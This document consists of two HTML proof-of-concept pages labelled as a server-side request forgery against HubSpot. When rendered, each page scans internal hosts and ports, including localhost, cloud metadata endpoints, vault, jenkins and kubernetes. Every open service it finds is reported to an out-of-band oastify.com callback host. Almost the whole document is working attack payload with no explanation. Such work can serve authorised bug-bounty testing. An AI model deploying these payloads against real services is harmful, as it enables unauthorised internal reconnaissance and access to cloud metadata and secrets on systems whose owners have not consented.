## Hubspot SSRF

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF PoC</title>
</head>

<body>
    <h1>Hello</h1>
    <img src="https://d3h4esvh2je58ucwomm7ig844vamygm5.oastify.com/?ItsRenderingHtml">
    <script>
        const ports = [22, 80, 443, 8000, 8080, 3000, 5000];
        const host = "http://localhost";

        ports.forEach(port => {
            fetch(`${host}:${port}`, { mode: "no-cors" })
                .then(() => fetch(`https://99g0ko1d8fk1eqisuis3oce0argi4ds2.oastify.com/?open=${port}`))
                .catch(() => { });
        });

    </script>
</body>

</html>


## Hubspot SSRF 2

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF PoC</title>
</head>

<body>
    <h1>Hello</h1>
    <img src="https://tc9kn84xbznlhalcx2vnrwhkdbj270vp.oastify.com/?ItsRenderingHtml">
    <script>
        const hosts = [
            "localhost",
            "127.0.0.1",
            "host.docker.internal",
            "internal",
            "gateway",
            "metadata.google.internal",
            "metadata.aws.internal",
            "kubernetes.default",
            "vault.internal",
            "jenkins.internal",
            "grafana",
            "prometheus",
            "gitlab",
            "nexus",
            "dev",
            "staging",
            "prod",
            "db",
            "admin"
        ];

        const ports = [80, 443, 8080, 3000, 5000, 8000];

        hosts.forEach(host => {
            ports.forEach(port => {
                fetch(`http://${host}:${port}`, { mode: "no-cors" })
                    .then(() => {
                        fetch(`https://tc9kn84xbznlhalcx2vnrwhkdbj270vp.oastify.com/?open=${host}:${port}`);
                    })
                    .catch(() => { });
            });
        });

    </script>

</body>

</html>